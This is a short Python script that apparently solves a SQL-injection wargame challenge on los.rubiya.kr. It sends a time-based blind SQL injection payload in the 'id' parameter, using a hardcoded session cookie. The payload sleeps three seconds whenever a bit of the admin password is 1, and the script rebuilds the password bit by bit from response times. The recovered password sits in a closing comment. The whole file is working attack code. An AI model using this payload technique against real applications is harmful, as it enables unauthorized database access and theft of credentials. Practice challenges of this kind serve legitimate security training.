import requests
import timeit

def blindi():
	password=""
	cookies={"PHPSESSID":"2jmdje149iheon8es94327lllt"}
	
	for i in range(1,9):
		word=""
		for j in range(1,9):
			URL="https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?id=admin' and if(substr(lpad(bin(ord(substr(pw,"+str(i)+",1))),8,'0'),"+str(j)+",1)=1, sleep(3), 0) ;%00"
			# timecheck		
			start_time = timeit.default_timer()
			response = requests.get(URL, cookies=cookies)
			if "No Hack ~_~" in response.text:
				end_time = timeit.default_timer()
				response_time=float(end_time) - float(start_time)
			print("progress : " + str(j) + " time : " + str(response_time))
			if response_time > 3:
				word+=str(1)
			else:
				word+=str(0)
			print("current word : "+ str(word))
		password+=chr(int(word,2))
		print("current password : " + password)
	
	print("admin's Password : " + password)
	
if __name__ == "__main__":
	print("Start Program")
	blindi()
	# password : d948b8a0
